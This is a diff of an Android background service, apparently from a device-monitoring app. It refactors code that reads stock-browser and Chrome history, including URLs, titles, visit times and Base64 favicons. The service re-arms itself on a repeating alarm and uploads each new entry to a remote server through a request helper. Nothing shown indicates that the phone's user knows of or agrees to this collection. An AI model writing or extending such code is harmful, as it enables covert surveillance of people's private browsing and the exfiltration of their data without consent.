@@ -5,7 +5,6 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
 import org.json.JSONException;
-import org.json.JSONObject;
 
 import android.annotation.SuppressLint;
 import android.app.AlarmManager;
@@ -23,10 +22,11 @@ import android.preference.PreferenceManager;
 import android.provider.Browser;
 import android.util.Base64;
 
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
+import com.loopj.android.http.RequestParams;
 
 /**
  * Browser history viewing class
@@ -48,7 +48,7 @@ public class LinkService extends Service {
 	public int onStartCommand(Intent intent, int flags, int startId) {
 
 		sp = PreferenceManager.getDefaultSharedPreferences(this);
-		
+
 		Calendar cal = Calendar.getInstance();
 		// restart task after 1 minute
 		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));
@@ -61,7 +61,8 @@ public class LinkService extends Service {
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
 
-		if (ValueWork.getState(ConstantValue.TYPE_HISTORY_BROUSER_REQUEST, this) == 0)
+		if (AppSettings.getState(AppConstants.TYPE_HISTORY_BROUSER_REQUEST,
+				this) == 0)
 			return 0;
 
 		try {
@@ -107,8 +108,6 @@ public class LinkService extends Service {
 			while (mCur.isAfterLast() == false && cont) {
 				urlDate = mCur.getString(mCur
 						.getColumnIndex(Browser.BookmarkColumns.DATE));
-				Context context = getApplicationContext();
-
 				DateFormat formatter = new SimpleDateFormat(
 						"yyyy-MM-dd HH:mm:ss");
 
@@ -119,8 +118,7 @@ public class LinkService extends Service {
 
 				if (Long.parseLong(urlDate) > Long.parseLong(savedTime)) {
 
-					JSONObject info = new JSONObject();
-					JSONObject object = new JSONObject();
+					RequestParams params = new RequestParams();
 
 					Logging.doLog(
 							LOG_TAG,
@@ -147,7 +145,7 @@ public class LinkService extends Service {
 							encodedImage = Base64.encodeToString(favicon,
 									Base64.DEFAULT);
 							Logging.doLog(LOG_TAG, "image", "image");
-							info.put("icon", encodedImage);
+							params.put("data[][info][icon]", encodedImage);
 							favicon = null;
 
 						}
@@ -157,21 +155,16 @@ public class LinkService extends Service {
 					String urlDateInFormat = formatter.format(
 							calendar.getTime()).toString();
 
-					// String sendJSONStr = null;
+					params.put("data[][info][url]", url);
+					params.put("data[][info][name]", title);
 
-					try {
+					params.put("data[][time]", urlDateInFormat);
+					params.put("data[][type]",
+							AppConstants.TYPE_HISTORY_BROUSER_REQUEST);
+					params.put("key", System.currentTimeMillis());
 
-						info.put("url", url);
-						info.put("name", title);
-						object.put("time", urlDateInFormat);
-						object.put("type", "7");
-						object.put("info", info);
-						// sendJSONStr = jsonObject.toString();
-						// sendJSONStr = data.toString();
-					} catch (JSONException e) {
-						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
-					}
-					RequestList.sendDataRequest(object.toString(), this);
+					RequestList
+							.sendDataRequest(params, getApplicationContext());
 
 					Editor ed = sp.edit();
 					ed.putString(SAVED_TIME, urlDate);
@@ -204,12 +197,10 @@ public class LinkService extends Service {
 				while (chromeCursor.isAfterLast() == false && cont) {
 					String encodedImage;
 					// String sendJSONStr = null;
-					JSONObject info = new JSONObject();
-					JSONObject object = new JSONObject();
+					RequestParams params = new RequestParams();
 
 					chromeUrlDate = chromeCursor.getString(chromeCursor
 							.getColumnIndex(Browser.BookmarkColumns.DATE));
-					Context context = getApplicationContext();
 
 					DateFormat formatter = new SimpleDateFormat(
 							"yyyy-MM-dd HH:mm:ss");
@@ -243,7 +234,7 @@ public class LinkService extends Service {
 							if (favicon != null) {
 								encodedImage = Base64.encodeToString(favicon,
 										Base64.DEFAULT);
-								info.put("icon", encodedImage);
+								params.put("data[][info][icon]", encodedImage);
 								favicon = null;
 
 							}
@@ -255,22 +246,16 @@ public class LinkService extends Service {
 						String urlDateInFormat = formatter.format(
 								calendar.getTime()).toString();
 
-						try {
+						params.put("data[][info][url]", chromeUrl);
+						params.put("data[][info][name]", chromeTitle);
 
-							info.put("url", chromeUrl);
-							info.put("name", chromeTitle);
+						params.put("data[][time]", urlDateInFormat);
+						params.put("data[][type]",
+								AppConstants.TYPE_HISTORY_BROUSER_REQUEST);
+						params.put("key", System.currentTimeMillis());
 
-							object.put("time", urlDateInFormat);
-							object.put(
-									"type",
-									ConstantValue.TYPE_HISTORY_BROUSER_REQUEST);
-							object.put("info", info);
-						} catch (JSONException e) {
-							Logging.doLog(LOG_TAG, "json сломался",
-									"json сломался");
-						}
-
-						RequestList.sendDataRequest(object.toString(), this);
+						RequestList.sendDataRequest(params,
+								getApplicationContext());
 
 						Editor ed = sp.edit();
 						ed.putString(SAVED_TIME, chromeUrlDate);
